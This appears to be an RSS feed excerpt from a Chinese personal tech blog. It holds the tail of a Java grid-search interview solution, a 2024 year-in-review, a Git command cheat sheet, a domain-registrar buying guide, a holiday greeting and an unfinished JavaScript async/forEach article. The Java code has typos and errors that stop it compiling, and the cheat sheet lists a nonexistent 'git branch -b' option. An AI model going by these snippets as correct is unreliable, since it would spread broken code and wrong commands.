&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">record</span> <span class="title class_">SearchResult</span><span class="params">(<span class="type">boolean</span> found, List&lt;Point&gt; next)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findMinimalRoutine</span><span class="params">(<span class="type">int</span>[][] routines, Point customer)</span> &#123;</span><br><span class="line">    List&lt;Point&gt; next = Collections.singleton(customer);</span><br><span class="line">    <span class="type">int</span> <span class="variable">minimalPath</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        result = findNextPoints(routines, next);</span><br><span class="line">        <span class="keyword">if</span> (result.found) &#123;</span><br><span class="line">            <span class="keyword">return</span> minimalPath;</span><br><span class="line">        &#125;</span><br><span class="line">        minimalPath += <span class="number">1</span>;</span><br><span class="line">        next = result.next;</span><br><span class="line">    &#125; <span class="keyword">while</span> (next != <span class="literal">null</span> &amp;&amp; !next.isEmpty());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> SearchResult <span class="title function_">findNextPoints</span><span class="params">(<span class="type">int</span>[][] routines, List&lt;Point&gt; currentPoints)</span> &#123;</span><br><span class="line">    List&lt;Point&gt; resultPoints = <span class="keyword">new</span> <span class="title class_">ArraryList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Point currentPoint : currentPoints) &#123;</span><br><span class="line">        List&lt;Point&gt; nextPoints = findNextPoints(routines, currentPoint);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Point nextPoint : nextPoints) &#123;</span><br><span class="line">            <span class="keyword">if</span> (routines[nextPoint.x][nextPoint.y] == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SearchResult</span>(<span class="literal">true</span>, Collections.emptyList());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            routines[nextPoint.x][nextPoint.y] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        resultPoints.addAll(nextPoints);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SearchResult</span>(<span class="literal">false</span>, resultPoints);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> List&lt;Point&gt; <span class="title function_">findNextPoints</span><span class="params">(<span class="type">int</span>[][] routines, Point point)</span> &#123;</span><br><span class="line">    List&lt;Point&gt; nextPoints = <span class="keyword">new</span> <span class="title class_">ArraryList</span>&lt;&gt;(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (availablePoint(routines, point.x - <span class="number">1</span>, point.y)) &#123;</span><br><span class="line">        nextPoints.add(<span class="keyword">new</span> <span class="title class_">Point</span>(point.x - <span class="number">1</span>, point.y));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (availablePoint(routines, point.x, point.y - <span class="number">1</span>)) &#123;</span><br><span class="line">        nextPoints.add(<span class="keyword">new</span> <span class="title class_">Point</span>(point.x, point.y - <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (availablePoint(routines, point.x + <span class="number">1</span>, point.y)) &#123;</span><br><span class="line">        nextPoints.add(<span class="keyword">new</span> <span class="title class_">Point</span>(point.x + <span class="number">1</span>, point.y));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (availablePoint(routines, point.x, point.y + <span class="number">1</span>)) &#123;</span><br><span class="line">        nextPoints.add(<span class="keyword">new</span> <span class="title class_">Point</span>(point.x, point.y + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> nextPoints;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">availablePoint</span><span class="params">(<span class="type">int</span>[][] routines, <span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x &gt;= <span class="number">0</span> &amp;&amp; x &lt; routines.length &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; y &lt;= routines[<span class="number">0</span>].length &amp;&amp; (routines[x][y] == <span class="number">0</span> || routines[x][y] == -<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E9%9D%A2%E8%AF%95/">面试</category>
      
      <category domain="https://zerospace.dev/tags/%E7%BC%96%E7%A8%8B/">编程</category>
      
      <category domain="https://zerospace.dev/tags/%E7%AE%97%E6%B3%95/">算法</category>
      
      
      <comments>https://zerospace.dev/posts/40f451e9/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2024年度总结</title>
      <link>https://zerospace.dev/posts/c2cf88b8/</link>
      <guid>https://zerospace.dev/posts/c2cf88b8/</guid>
      <pubDate>Tue, 31 Dec 2024 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;2024 年，这一年就像做梦一样的度过，还好，我终是梦醒了，也没有睡过头&lt;/p&gt;
&lt;p&gt;这一年里，我完成了许多人生中的“第一次”：第一次交女朋友，第一次构建一台完整的服务器&lt;/p&gt;
&lt;p&gt;我亲眼目睹了我自己的人生，也看到了人生中的美好，体验了万人狂欢的热烈夜晚，也感受到了“</description>
        
      
      
      
      <content:encoded><![CDATA[<p>2024 年，这一年就像做梦一样的度过，还好，我终是梦醒了，也没有睡过头</p><p>这一年里，我完成了许多人生中的“第一次”：第一次交女朋友，第一次构建一台完整的服务器</p><p>我亲眼目睹了我自己的人生，也看到了人生中的美好，体验了万人狂欢的热烈夜晚，也感受到了“风吹草低见牛羊”的诗意与真实</p><p>我的个人站点迎来了第 2 个年头。在努力学习的同时，我不断努力打造个人 IP，将我对编程事业的热爱、科技探索、软件发烧友的多重身份分享给更多人</p><p>在这过程中，我也结识了许多志同道合的朋友，拓宽了自己的视野与圈子</p><p>接下来是我对 2024 年的总结，想与你分享</p><h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p>在学习中，我持续保持高质量输出，并不断提升自己的技术影响力</p><p>在项目中，我逐渐担任核心研发角色，并成功迈入开发工程师的行列，迎来了个人专业发展的重要里程碑</p><p>回望今年，也是我学习前后端技术的第三年</p><p>这段旅程充满挑战，但也伴随着成长与喜悦</p><h2 id="站点"><a href="#站点" class="headerlink" title="站点"></a>站点</h2><p>今年，我的站点终于在静态化的阵营中稳稳站住了脚</p><p>经过不断摸索，我逐步完善并打造出了一套专属的部署模式，兼具高效性与性价比，让站点的运维更加从容</p><p>同时，我也在持续努力创作优质文章，不断丰富站点的内容</p><p>今年，看到更多人关注我的分享，倍感欣慰与动力十足</p><h2 id="开源"><a href="#开源" class="headerlink" title="开源"></a>开源</h2><p>今年的开源主要体现在博客和站点的维护上</p><p>但其实，分享文章与传播技术，又何尝不是另一种形式的开源呢</p><p><img src="https://s2.loli.net/2025/01/02/sCARv3iSTftwcYK.png" alt="AsZer0s - GitHub - 2024"></p><h2 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h2><p>今年，是我人生中最难忘的一年</p><p>感激家人一直以来的陪伴与关怀，而我最想感谢的，是在我最艰难的时候始终陪伴在身边、鼓励我的她</p><p>这一场如梦般的经历，好在我醒了过来，并且没有睡过头</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>2024 年，收获了很多，也得到了很多</p><p>人生很长、要经历无数悲欢离合、阴晴圆缺，人生又很短、岁岁年年转瞬即逝、不得停留</p><p>珍惜当下、过好每一天、与自己的爱人、亲人和朋友</p><p>最后，感谢你的阅读，让我们 2025 年变得更强～</p><p><a href="https://hiyun.top/">AsZer0s</a> - <a href="https://blog.hiyun.top/">Zer0Teams</a><br>2025 年，新年快乐！</p>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E6%9D%82%E8%B0%88/">杂谈</category>
      
      <category domain="https://zerospace.dev/tags/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/">年度总结</category>
      
      
      <comments>https://zerospace.dev/posts/c2cf88b8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Git常用命令汇总</title>
      <link>https://zerospace.dev/posts/15720db2/</link>
      <guid>https://zerospace.dev/posts/15720db2/</guid>
      <pubDate>Sat, 28 Dec 2024 04:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;常规操作&quot;&gt;&lt;a href=&quot;#常规操作&quot; class=&quot;headerlink&quot; title=&quot;常规操作&quot;&gt;&lt;/a&gt;常规操作&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;git push origin test&lt;/code&gt; 推送本地分支到远程仓库&lt;/li&gt;
&lt;li&gt;&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h2><ul><li><code>git push origin test</code> 推送本地分支到远程仓库</li><li><code>git rm -r --cached</code> 文件&#x2F;文件夹名字 取消文件被版本控制</li><li><code>git reflog</code> 获取执行过的命令</li><li><code>git log --graph</code> 查看分支合并图</li><li><code>git merge --no-ff -m &#39;合并描述&#39;</code> 分支名不使用 <code>Fast forward</code> 方式合并，采用这种方式合并可以看到合并记录</li><li><code>git check-ignore -v 文件名</code> 查看忽略规则</li><li><code>git add -f 文件名</code> 强制将文件提交</li></ul><h2 id="Git-创建项目仓库"><a href="#Git-创建项目仓库" class="headerlink" title="Git 创建项目仓库"></a>Git 创建项目仓库</h2><ul><li><code>git init</code> 初始化</li><li><code>git remote add origin url</code> 关联远程仓库</li><li><code>git pull</code></li><li><code>git fetch</code> 获取远程仓库中所有的分支到本地</li></ul><h2 id="忽略已加入到版本库中的文件"><a href="#忽略已加入到版本库中的文件" class="headerlink" title="忽略已加入到版本库中的文件"></a>忽略已加入到版本库中的文件</h2><ul><li><code>git update-index --assume-unchanged file</code> 忽略单个文件</li><li><code>git rm -r --cached 文件/文件夹名字</code> (. 忽略全部文件)</li></ul><h2 id="取消忽略文件"><a href="#取消忽略文件" class="headerlink" title="取消忽略文件"></a>取消忽略文件</h2><ul><li><code>git update-index --no-assume-unchanged file</code></li></ul><h2 id="拉取、上传免密码"><a href="#拉取、上传免密码" class="headerlink" title="拉取、上传免密码"></a>拉取、上传免密码</h2><ul><li><code>git config --global credential.helper store</code></li></ul><h2 id="分支操作"><a href="#分支操作" class="headerlink" title="分支操作"></a>分支操作</h2><ul><li><code>git branch</code> 创建分支</li><li><code>git branch -b</code> 创建并切换到新建的分支上</li><li><code>git checkout</code> 切换分支</li><li><code>git branch</code> 查看分支列表</li><li><code>git branch -v</code> 查看所有分支的最后一次操作</li><li><code>git branch -vv</code> 查看当前分支</li><li><code>git branch -b 分支名 origin/分支名</code> 创建远程分支到本地</li><li><code>git branch --merged</code> 查看别的分支和当前分支合并过的分支</li><li><code>git branch --no-merged</code> 查看未与当前分支合并的分支</li><li><code>git branch -d 分支名</code> 删除本地分支</li><li><code>git branch -D 分支名</code> 强行删除分支</li><li><code>git push origin --delete 分支名</code> 删除远程仓库分支</li><li><code>git merge 分支名</code> 合并分支到当前分支上</li></ul><h2 id="暂存操作"><a href="#暂存操作" class="headerlink" title="暂存操作"></a>暂存操作</h2><ul><li><code>git stash</code> 暂存当前修改</li><li><code>git stash apply</code> 恢复最近的一次暂存</li><li><code>git stash pop</code> 恢复暂存并删除暂存记录</li><li><code>git stash list</code> 查看暂存列表</li><li><code>git stash drop 暂存名</code> (例：stash@{0}) 移除某次暂存</li><li><code>git stash clear</code> 清除暂存</li></ul><h2 id="回退操作"><a href="#回退操作" class="headerlink" title="回退操作"></a>回退操作</h2><ul><li><code>git reset --hard HEAD^</code> 回退到上一个版本</li><li><code>git reset --hard commitId</code> 回退到某个版本</li><li><code>git checkout -- file</code> 撤销修改的文件(如果文件加入到了暂存区，则回退到暂存区的，如果文件加入到了版本库，则还原至加入版本库之后的状态)</li><li><code>git reset HEAD file</code> 撤回暂存区的文件修改到工作区</li></ul><h2 id="标签操作"><a href="#标签操作" class="headerlink" title="标签操作"></a>标签操作</h2><ul><li><code>git tag 标签名</code> 添加标签(默认对当前版本)</li><li><code>git tag 标签名 commitId</code> 对某一提交记录打标签</li><li><code>git tag -a 标签名 -m &#39;描述&#39;</code> 创建新标签并增加备注</li><li><code>git tag</code> 列出所有标签列表</li><li><code>git show 标签名</code> 查看标签信息</li><li><code>git tag -d 标签名</code> 删除本地标签</li><li><code>git push origin 标签名</code> 推送标签到远程仓库</li><li><code>git push origin --tags</code> 推送所有标签到远程仓库</li><li><code>git push origin :refs/tags/标签名</code> 从远程仓库中删除标签</li></ul><h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><ul><li><code>git remote -v</code> 查看远程仓库地址</li><li><code>git remote show origin</code> 查看远程仓库详情信息</li></ul><h2 id="查看某个-commit-提交属于哪个分支"><a href="#查看某个-commit-提交属于哪个分支" class="headerlink" title="查看某个 commit 提交属于哪个分支"></a>查看某个 commit 提交属于哪个分支</h2><ul><li><code>git branch -l --contains &lt;commit_id&gt;</code> 本地分支</li><li><code>git branch -r --contains &lt;commit_id&gt;</code> 远程分支</li><li><code>git branch --all --contains &lt;commit_id&gt;</code> 所有分支</li></ul>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E5%BC%80%E5%8F%91/">开发</category>
      
      <category domain="https://zerospace.dev/tags/%E7%BD%91%E7%BB%9C/">网络</category>
      
      <category domain="https://zerospace.dev/tags/%E8%BD%AF%E4%BB%B6/">软件</category>
      
      <category domain="https://zerospace.dev/tags/Git/">Git</category>
      
      
      <comments>https://zerospace.dev/posts/15720db2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>我想要一个域名，我该如何选购</title>
      <link>https://zerospace.dev/posts/fe7f5423/</link>
      <guid>https://zerospace.dev/posts/fe7f5423/</guid>
      <pubDate>Thu, 26 Dec 2024 08:10:50 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p&gt;本文章来自 &lt;a href=&quot;https://blog.auriel.top/&quot;&gt;Aurielの博客&lt;/a&gt;&lt;br&gt;原文章地址请戳 &lt;a href=&quot;https://blog.auriel.top/post/dd83a796/#%E9%9C%80%</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p>本文章来自 <a href="https://blog.auriel.top/">Aurielの博客</a><br>原文章地址请戳 <a href="https://blog.auriel.top/post/dd83a796/#%E9%9C%80%E8%A6%81%E9%81%BF%E5%85%8D%E7%9A%84%E4%BA%8B%E9%A1%B9">Aurielの博客-新手建站（一）：从一个有意义的域名开始</a></p></blockquote><hr><h2 id="域名是什么？"><a href="#域名是什么？" class="headerlink" title="域名是什么？"></a>域名是什么？</h2><p>网域名称（英语：Domain Name，简称：Domain）<br>简称域名、网域，是由一串用点分隔的字符组成的互联网上某一台电脑或电脑组的名称，用于在数据传输时标识电脑的电子方位<br>域名可以说是一个IP地址的代称，目的是为了便于记忆后者</p><p>IP地址是因特网主机的作为路由寻址用的数字体标识，不容易记忆<br>因而产生了域名这一种字符型标识，它比IP地址更容易记忆<br>这也是域名的一个重要功能——为数字化的互联网资源提供易于记忆的名称</p><p>另外，域名具有唯一性，在资源更改IP地址时，只需要进行新IP地址与恒定域名的转换<br>即可实现将资源移动到网络地址拓扑中的不同物理位置<br>基于以上两个特性，域名还用于创建个体的唯一标识<br>任何组织和个人在提供因特网资源时，都可以选择与其名称对应的域名，让其他人轻松访问这些资源</p><h2 id="域名的重要性"><a href="#域名的重要性" class="headerlink" title="域名的重要性"></a>域名的重要性</h2><p>选择一个合适的域名是进军网络世界的一个重要步骤<br>网站用户会通过您的域名建立起对您的企业或组织的初步印象<br>因此，一个令人印象深刻的域名有助于激发用户的兴趣并吸引 Web 流量</p><h2 id="选择域名后缀"><a href="#选择域名后缀" class="headerlink" title="选择域名后缀"></a>选择域名后缀</h2><p>| 域名后缀 | 有关说明（联想意较多，在此省略）                         |<br>|———-|———————————————————-|<br>| .com     | 商业机构，现在任何人都可以注册                           |<br>| .net     | 网络组织，例如因特网服务商和维修商，现在任何人都可以注册 |<br>| .co      | 哥伦比亚共和国国家地区顶级域                             |<br>| .org     | 非盈利组织，现在任何人都可以注册                         |<br>| .xyz     | 表示无限潜力                                             |<br>| .cn      | 中华人民共和国的顶级域域名                               |<br>| .io      | 英属印度洋国家地区顶级域                                 |<br>| .me      | 用于个人                                                 |<br>| .info    | 网络信息服务组织                                         |<br>| .in      | 印度国家和地区顶级域                                     |<br>| .top     | 表示“顶端”之意                                           |<br>| .ai      | 英国海外属地安圭拉国家及地区顶级域                       |<br>| .eu      | 欧洲联盟国家及地区顶级域                                 |<br>| .online  | 表示“在线”之意                                           |<br>| .us      | 美国国家和地区顶级域                                     |<br>| .biz     | 商业                                                     |<br>| .gg      | 英国王室属地根西岛国家及地区顶级域                       |<br>| .tv      | 图瓦卢国家及地区顶级域，有“电视”之意                     |<br>| .tech    | 表示“科技”之意                                           |<br>| .cc      | 澳洲海外领地科科斯（基林）群岛国家及地区顶级域           |<br>| .dev     | 表示“开发”之意                                           |<br>| .club    | 表示“俱乐部”之意                                         |<br>| .de      | 德国国家和地区顶级域                                     |<br>| .app     | 用于应用支持服务以及相关的产品或工具                     |</p><h2 id="选择域名注册商"><a href="#选择域名注册商" class="headerlink" title="选择域名注册商"></a>选择域名注册商</h2><h3 id="选择合适的域名注册商"><a href="#选择合适的域名注册商" class="headerlink" title="选择合适的域名注册商"></a>选择合适的域名注册商</h3><p>在选择最佳域名注册商时，我们会考虑以下四个标准：</p><ol><li>定价和注册期限<br>您要检查的第一件事是域名价格<br>例如，一些域名注册商可能会为第一年的注册提供低价，但他们的续订价格可能会有所不同，而且会高得多<br>您还需要检查域转移、续订和其他费用的任何额外费用</li></ol><p>这里有一些域名比价平台<br><a href="https://zh-hans.tld-list.com/">TLD-List</a><br><a href="https://domcomp.com/">Domcomp</a><br><a href="https://www.nazhumi.com/">哪煮米</a></p><ol start="2"><li>域名转移<br>域名可以从一个域名注册商转移到另一个域名注册商<br>您需要牢记的是，您不能在注册后的前 60 天内转让域名<br>这个初始阶段由 ICANN 决定<br>之后，您可以将其移至您想要的任何其他注册商</li></ol><p>大多数域名注册商都可以轻松转移域名而无需支付任何额外费用<br>但是，有些人可能会尝试使其复杂化或收取额外费用来解除域锁定<br>在从注册商处购买域名之前，请务必查看域名转移政策</p><ol start="3"><li>域名过期政策<br>域名在特定期限内注册。您可以在到期日期之前续订您的域注册<br>但是，如果您忘记更新您的域名，那么它就会过期并且任何人都可以注册它<br>对于企业来说，这意味着有人可以接管他们的域名<br>为确保不会发生这种情况，您可以为您的域名设置自动续订</li></ol><p>即使您使用自动续订功能，也最好检查您的域名注册商的过期政策<br>一些域名注册商甚至在到期后提供宽限期。此宽限期允许您续订过期的域名<br>而错误的域名注册服务会立即将您的过期域名拍卖给出价最高的人</p><ol start="4"><li>附加服务<br>您可能还想查看您的域名注册商提供的其他服务<br>虽然您现在可能不需要这些服务，但很高兴知道他们有这些服务</li></ol><p>这些附加服务可能包括域隐私、域停放、延长过期保护等<br>一些域名注册商甚至可能出售WordPress 托管服务、电子邮件托管服务、网站建设者、电子邮件营销服务等</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>以下是选择域名注册商时需要注意的一些事项：</p><ol><li><p>附加定价<br>一些域名注册商可以在您购买域名时自动预检附加服务<br>如果您不取消选中这些选项，那么这将大大增加您的账单</p></li><li><p>用户体验<br>大多数域名注册商都试图让他们的网站易于使用，这样他们就可以留住您的客户<br>但是，一些域名注册商的做法恰恰相反<br>这将使您难以更改您的域名设置</p></li><li><p>隐藏费用<br>在选择域名注册商时，您可能还需要寻找隐藏的成本和费用<br>一些域名注册商可能会为首次注册的更便宜的域名提供特别优惠<br>域名的续费成本往往相差甚远，甚至更高<br>所有优秀的域名注册商都可以轻松地将您的域名转移到另一家公司<br>但是，有些会收取额外费用</p></li><li><p>WHOIS保护<br>部分注册商免费提供WHOIS保护，而另一部分则需要额外付费<br>需要注意的是，没有WHOIS保护会使你的个人信息公开，很可能会收到各种垃圾邮件</p></li><li><p>有关国内的注册商<br>国内的注册商在注册域名时要求实名认证，如果绑定云服务器的话还需要备案<br>如果未进行相关手续将无法使用</p></li></ol><p>国外常用的域名注册商对比（仅供参考）<br>|             | NameSilo                | NameCheap       | Google Domains     | Domain.com      | GoDaddy                 |<br>|————-|————————-|—————–|——————–|—————–|————————-|<br>| 价格        | 较低                    | 较低            | 一般               | 一般            | 一般                    |<br>| WHOIS保护   | 免费                    | 免费            | 免费               | 付费            | 付费                    |<br>| DNSSEC保护  | 免费                    | 付费            | 免费               | 付费            | 付费                    |<br>| ICANN手续费 | 无                      | 有              | 无                 | 有              | 有                      |<br>| 支付方式    | 支付宝、Pay Pal、信用卡 | Pay Pal、信用卡 | Google Pay、信用卡 | Pay Pal、信用卡 | 支付宝、Pay Pal、信用卡 |</p><h2 id="思考一个域名前缀"><a href="#思考一个域名前缀" class="headerlink" title="思考一个域名前缀"></a>思考一个域名前缀</h2><h3 id="选择一个令人印象深刻的域名"><a href="#选择一个令人印象深刻的域名" class="headerlink" title="选择一个令人印象深刻的域名"></a>选择一个令人印象深刻的域名</h3><p>下面介绍一些可帮助您选择最合适的域名的准则：</p><ol><li><p>域名长度<br>建议使用短域名，通常为 3 至 4 个字词<br>短域名更容易被记住和键入，可帮助用户更轻松地直达您的网站</p></li><li><p>关键字<br>确保您的域名中的字词与您发布的内容相关<br>描述性字词可帮助首次到访者了解网站的内容<br>此外，如果您使用描述性字词，那么当用户搜索与这些字词相关的产品或服务时，您的网站会更有可能出现在搜索结果中</p></li><li><p>地理位置<br>如果您的目标受众在一个特定的区域内，您可以在域名中添加该地理位置名称<br>这样做有助于过滤掉不在您的服务区域内的非预期受众</p></li><li><p>品牌名称<br>品牌是一个专属标识性形象，可帮助您的域名脱颖而出<br>由于用户能快速认出历史悠久的品牌，因此品牌有助于企业发展自己的特色以及长久传承<br>品牌的发展需要时间，不过一个成功的品牌可以增加您网站的受欢迎程度</p></li></ol><h3 id="需要避免的事项"><a href="#需要避免的事项" class="headerlink" title="需要避免的事项"></a>需要避免的事项</h3><p>以下做法可能会对域名的形象产生负面影响：</p><ol><li><p>数字或短划线<br>使用这些字符可能会让用户难以键入或记住您的网站名称</p></li><li><p>使用的字词或企业名称有拼写错误<br>这类错误可能会让用户怀疑您的网站是垃圾网站或网上诱骗网站</p></li><li><p>与已有品牌或商标相似<br>如果您的网站名称和托管内容与已有企业的网站名称和内容相似<br>可能会为自己招来版权投诉或滥用行为投诉<br>进而导致域名被暂停和&#x2F;或遭到法律诉讼<br>在争议得到解决之前，访问者可能无法访问您的网站或向您发送电子邮件</p></li></ol><p>几个域名生成器<br><a href="https://leandomainsearch.com/">Lean Domain Search</a><br><a href="https://domainwheel.com/">Domain Wheel</a><br><a href="https://www.panabee.com/">Panabee</a><br><a href="https://namelix.com/">Namelix</a><br><a href="https://www.nameboy.com/">Nameboy</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D">维基百科：域名</a><br><a href="https://zh.wikipedia.org/wiki/%E4%BA%92%E8%81%94%E7%BD%91%E9%A1%B6%E7%BA%A7%E5%9F%9F%E5%88%97%E8%A1%A8">维基百科：互联网顶级域列表</a><br><a href="https://zhuanlan.zhihu.com/p/591552306">知乎：如何选择 2022 年最佳域名注册商</a><br><a href="https://zhuanlan.zhihu.com/p/344978462">知乎：国外5+个常用的域名注册商</a></p>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E6%9D%82%E8%B0%88/">杂谈</category>
      
      <category domain="https://zerospace.dev/tags/%E7%BD%91%E7%BB%9C/">网络</category>
      
      <category domain="https://zerospace.dev/tags/%E5%9F%9F%E5%90%8D/">域名</category>
      
      
      <comments>https://zerospace.dev/posts/fe7f5423/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>冬至快乐</title>
      <link>https://zerospace.dev/posts/6bc92820/</link>
      <guid>https://zerospace.dev/posts/6bc92820/</guid>
      <pubDate>Sat, 21 Dec 2024 13:51:40 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;冬至到了,祝各位&lt;br&gt;冬至快乐,阖家团圆&lt;br&gt;事事顺心,财源广进&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;同时&lt;br&gt;也祝我自己生日快乐&lt;br&gt;&lt;img src=&quot;https://s2.loli.net/2024/12/21/lo6OjDv3VWqecbM.jpg&quot; alt=&quot;饺子&quot;&gt;</description>
        
      
      
      
      <content:encoded><![CDATA[<p>冬至到了,祝各位<br>冬至快乐,阖家团圆<br>事事顺心,财源广进</p><hr><p>同时<br>也祝我自己生日快乐<br><img src="https://s2.loli.net/2024/12/21/lo6OjDv3VWqecbM.jpg" alt="饺子"></p>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E6%9D%82%E8%B0%88/">杂谈</category>
      
      
      <comments>https://zerospace.dev/posts/6bc92820/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>JavaScript中forEach方法的async/await异步问题</title>
      <link>https://zerospace.dev/posts/e6a259a0/</link>
      <guid>https://zerospace.dev/posts/e6a259a0/</guid>
      <pubDate>Thu, 19 Dec 2024 03:00:35 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;最近在用Node JS写个小项目的时候发现了一个之前没有注意过的问题&lt;br&gt;数组使用forEach方法进行异步操作时执行顺序可能会出现问题&lt;br&gt;这篇文章就来简单谈一谈产生这个问题具体原因以及解决方法&lt;/p&gt;
&lt;h2 id=&quot;问题描述&quot;&gt;&lt;a href=&quot;#问题描述&quot; cl</description>
        
      
      
      
      <content:encoded><![CDATA[<p>最近在用Node JS写个小项目的时候发现了一个之前没有注意过的问题<br>数组使用forEach方法进行异步操作时执行顺序可能会出现问题<br>这篇文章就来简单谈一谈产生这个问题具体原因以及解决方法</p><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>当时遇到的问题与SQL写入操作有关，简化一下相当于：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> numList = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">numList.<span class="title function_">forEach</span>(<span class="title function_">async</span> (e)=&gt;&#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">res, rej</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="comment">//模拟一个耗时不确定的异步过程</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">            <span class="title function_">res</span>(e);</span><br><span class="line">        &#125;, <span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">1000</span>); </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>本来期望的是使用await来阻塞异步函数，使其按循环顺序得到结果<br>但实际得到的却是一个随机的数列<br>下面来分析一下原因</p><h2 id="for循环中的情况"><a href="#for循环中的情况" class="headerlink" title="for循环中的情况"></a>for循环中的情况</h2><p>将上面的代码用for循环改写得到</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> numList = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; numList.<span class="property">length</span>; index++) &#123;</span><br><span class="line">        <span class="keyword">const</span> element = numList[index];</span><br><span class="line">        <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">res, rej</span>)=&gt;</span>&#123;</span><br><span class="line">            <span class="comment">//模拟一个耗时不确定的异步过程</span></span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(element)</span><br><span class="line">                <span class="title function_">res</span>(element);</span><br><span class="line">            &#125;, 